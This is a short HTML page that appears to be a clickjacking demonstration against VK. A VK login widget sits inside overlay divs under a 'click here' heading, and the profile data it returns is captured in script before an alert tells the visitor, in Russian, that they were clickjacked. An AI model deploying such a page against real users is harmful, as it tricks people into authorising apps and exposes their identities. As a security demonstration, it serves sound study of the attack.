<script src="http://vk.com/js/api/openapi.js"></script>
<script>
d = null;

function checkVk() {
    VK.init({
        apiId: '5114001'
    });
    function authInfo(response) {
        if (response.session) {
            console.log(response.session.mid);
        }
    }
    //VK.Auth.getLoginStatus(authInfo);
    VK.Widgets.Auth("vk_auth", {width: "200px", onAuth: function(data) {
    	console.log(data);
    	d= data;
    	alert('Уважемый '+data.first_name+', Вы стали жервой кликджекинга');
    }});
}
checkVk();


</script>


<h1>click here</h1>
<div id="overlay">
	<div id="wrap1">
		<div id="wrap2">
			<div id="vk_auth"></div>
		</div>
	</div>
</div>